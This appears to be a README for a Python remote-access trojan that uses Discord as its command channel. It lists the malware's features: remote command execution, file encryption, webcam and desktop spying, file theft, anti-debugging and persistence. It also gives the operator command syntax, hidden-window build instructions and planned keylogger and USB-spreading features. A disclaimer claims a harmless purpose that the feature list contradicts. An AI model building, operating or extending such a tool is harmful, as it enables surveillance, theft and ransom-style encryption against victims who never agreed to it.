Trojan for windows using Discord like C2 (BETA).

ATTENTION: THE AUTHOR OF DRIDEX HAS NO RESPONSIBILITY FOR HOW YOU WILL USE OR DO ANY DAMAGE WITH THIS MALWARE. THIS MALWARE IS DESIGNED TO TEST DIFFERENT FEATURES OF YOUR PC TO IMPROVE IT, NOT TO DO ANY HARM.

what can do this malware:
- exec commands on system
- encrypt files with personalized key
- decrypt file
- tiny protection from debugger using ctypes
- persistence (i will upgrade it)
- No VM (i will upgrade it)
- No Sanbox (i will upgrade it)
- Webcam spy
- Desktop spy
- Steal files

COMMANDS:

1) exec commands on system: exec <command>
2) encrypt files with personalized key: encrypt <file + exstension (example: file.txt)> <key (example: key123)>
3) decrypt file: decrypt <file + extension + enc (example: file.txt.enc)> <key (example: key123)>
4) Webcam spy: webcam
5) Desktop spy: screenshot
6) Steal files: download <filename + extension (example: file.txt)>

EXTRA COMMANDS:
1) ping
2) whoami
3) show a message on target machine: message <text (example: hello)>
4) alert on target system: alert <text (example: hello)>

command to make it.py to.exe correctly (not obfuscated):

Windows:
- python.exe pyinstaller --onefile --noconsole dridex.py

Linux:
- pyinstaller --onefile --noconsole dridex.py

WHAT WILL I ADD/UPGRADE:

- Microphone spy
- Keylogger
- No VM
- No Sandbox
- No Debugger
- File Uploader (u can already upload files using curl or wget (example: exec wget/curl ...)
- USB Spread
- Persistence (if the file is deleted thanks to another file, it will be recomposed as if nothing had happened)

REQUIREMENTS:

discord.py
pyautogui
opencv-python
pycryptodome
psutil
pynput
browser-history

COMMANDS TO INSTALL:

pip install discord.py
pip install pyautogui
pip install opencv-python
pip install pycryptodome
pip install psutil
pip install pynput
pip install browser-history
